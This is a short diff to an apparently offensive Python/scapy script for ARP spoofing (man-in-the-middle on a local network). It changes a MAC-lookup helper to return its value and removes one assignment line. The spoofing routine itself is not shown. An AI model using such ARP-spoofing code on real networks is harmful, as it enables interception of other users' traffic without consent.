@@ -24,7 +24,7 @@ def get_mac(ip_address):
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-    print(answered_list[0][1].hwsrc)
+    return answered_list[0][1].hwsrc
 
 def mitm_mac(mitm_interface):
     parse_mac = argparse.ArgumentParser()
@@ -48,7 +48,6 @@ def arp_spoof_target(target_ip, gateway_ip):
 options = get_arguments()
 print("[ ] Script Started.")
 print("[+] Querying for MAC Address..")
-target_mac = get_mac(options.target_ip)
 mitm_mac_address = mitm_mac(options.mitm_interface)
 print("[+] Spoofing Target..")
 arp_spoof_target(options.target_ip, options.gateway_ip)
